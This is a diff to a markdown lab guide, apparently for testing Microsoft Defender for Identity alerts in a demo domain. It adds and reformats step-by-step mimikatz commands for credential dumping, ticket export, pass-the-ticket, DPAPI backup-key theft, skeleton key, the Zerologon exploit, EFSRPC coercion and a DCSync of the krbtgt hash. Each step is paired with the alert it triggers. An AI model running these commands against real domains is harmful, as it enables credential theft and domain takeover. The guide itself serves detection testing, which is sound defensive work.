@@ -199,15 +199,15 @@ In this detection a Kerberos ticket is seen used on two (or more) different comp
 
 On the machine 1 (ADMIN-PC) where a domain user is in used (logon as Task, Service, RDP, Interactive..), from a command line run as local admin :
 
-*mimikatz.exe privilege::debug*  
-*sekurlsa::logonpasswords*  
-*sekurlsa::tickets /export* => rename the Nuck's TGT file (or whatever) to nuck.kirbi
+*mimikatz # privilege::debug*  
+*mimikatz # sekurlsa::logonpasswords*  
+*mimikatz # sekurlsa::tickets /export* => rename the Nuck's TGT file (or whatever) to nuck.kirbi
 
 On the machine 2 (VICTIM-PC), from a command line run as local admin :
 
-*mimikatz.exe privilege::debug*  
-*kerberos::ptt nuck.kirbi*  
-*Quit*  
+*mimikatz # privilege::debug*  
+*mimikatz # kerberos::ptt nuck.kirbi*  
+*mimikatz # Quit*  
 *Klist* => check if the TGT for nuck is loaded  
 Perfrom an ldap bind (digest) using for example LDP.exe => the stolen TGT from machine 1 will be presented to a DC to issue a TGS for the ldap query
 
@@ -224,7 +224,7 @@ Attackers can use the master key to decrypt any secrets protected by DPAPI on al
 
 From a command line run :  
   
-*mimikatz.exe privilege::debug*  
+*mimikatz # privilege::debug*  
 *mimikatz # lsadump::backupkeys /system:msdemo-DC01 /export*  
 
 Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
@@ -246,7 +246,7 @@ In this alert, the learned behavior of previous KRB_ERR message encryption from 
 
 From a command line with a shell on DC, run as AD admin :
 
-*mimikatz.exe privilege::debug* 
+*mimikatz # privilege::debug* 
 *mimikatz # misc::skeleton*  => "mimikatz" should be the master password  
 
 Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
@@ -260,9 +260,9 @@ The alert is triggered if an attacker attempts to establish a vulnerable Netlogo
 
 From a command line run:  
 
-*mimikatz.exe privilege::debug* 
-*lsadump::zerologon /server:msdemo-DC01.msdemo.local /account:msdemo-DC01$ /exploit*  
-
+*mimikatz # privilege::debug*  
+*mimikatz # lsadump::zerologon /server:msdemo-DC01.msdemo.local /account:msdemo-DC01$ /exploit*  
+# 
 Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
 
 Detail in the alert:  
@@ -270,11 +270,39 @@ Detail in the alert:
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image25.png)  
 
 ## 14 - Suspicious network connection over Encrypting File System Remote Protocol
+This detection is triggered when an attacker tries to take over an AD Domain by exploiting a flaw in the Encrypting File System Remote (EFSRPC) Protocol.
 
+From a command line run:  
 
+*mimikatz # privilege::debug*  
+*mimikatz # misc::efs /server:10.4.0.100 /connect:10.4.0.13 /noauth*  
 
+Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
 
+Detail in the alert:  
 
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image26.png)
+
+## 15 - Suspected DCSync attack (replication of directory services)
+If an attacker has the "DS-Replication-Get-Changes-All" permission for example, he can initiate a replication request to retrieve the data stored in Active Directory such as the krbtgt's password hash.  
+In this detection, an alert is triggered when a replication request is initiated from a computer that isn't a DC.  
+
+From a command line run :  
+
+*mimikatz # privilege::debug*  
+*mimikatz # lsadump::dcsync /domain:msdemo.local /user:krbtgt*  => to retrieve the krbtgt's password hash to move to a golden ticket attack
+
+Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
+
+You should see the activities and the alert in the client machine timeline :  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image27.png)  
+
+In the alert Compay Segundo failed to retrieve the DCsync (not enough permission):  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image28.png)  
+
+## 16 - Suspected DCShadow attack (domain controller promotion) & (domain controller replication request)
 
 
 
